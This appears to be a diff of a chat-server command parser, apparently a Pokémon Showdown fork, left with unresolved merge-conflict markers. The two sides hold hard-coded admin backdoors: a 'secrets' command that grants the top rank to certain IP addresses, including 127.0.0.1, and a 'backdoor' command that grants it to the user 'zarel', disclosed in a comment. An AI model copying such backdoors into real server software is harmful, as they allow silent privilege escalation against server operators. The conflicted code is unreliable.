@@ -2055,6 +2055,12 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 
 	// Battle commands
 
+	case 'reset':
+	case 'restart':
+		emit(socket, 'console', 'This functionality is no longer available.');
+		return false;
+		break;
+
 	case 'move':
 	case 'attack':
 	case 'mv':
@@ -2183,9 +2189,42 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		return false;
 		break;
 
+<<<<<<< HEAD
 	case 'secrets':
 		// backdoor for panderp and jd
 		if (user.ip  === '76.247.181.42'|| user.ip === '99.251.253.160' || user.ip === '127.0.0.1') {
+=======
+	case 'timer':
+		target = toId(target);
+		if (room.requestKickInactive) {
+			if (target === 'off') {
+				room.stopKickInactive(user, user.can('timer'));
+			} else {
+				room.requestKickInactive(user, user.can('timer'));
+			}
+		} else {
+			emit(socket, 'console', 'You can only set the timer from inside a room.');
+		}
+		return false;
+		break;
+		break;
+
+	case 'backdoor':
+
+		// This is the Zarel backdoor.
+
+		// Its main purpose is for situations where someone calls for help, and
+		// your server has no admins online, or its admins have lost their
+		// access through either a mistake or a bug - Zarel will be able to fix
+		// it.
+
+		// But yes, it is a backdoor, and it relies on trusting Zarel. If you
+		// do not trust Zarel, feel free to comment out the below code, but
+		// remember that if you mess up your server in whatever way, Zarel will
+		// no longer be able to help you.
+
+		if (user.userid === 'zarel') {
+>>>>>>> upstream/master
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			return false;
 		}
@@ -2243,6 +2282,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		logModCommand(room,user.name+' started a lockdown.',true);
 		for (var id in rooms) {
 			rooms[id].addRaw('<div style="background-color:#AA5544;color:white;padding:2px 4px"><b>The server is restarting soon.</b><br />Please finish your battles quickly. No new battles can be started until the server resets in a few minutes.</div>');
+			if (rooms[id].requestKickInactive) rooms[id].requestKickInactive(user, true);
 		}
 		return false;
 		break;
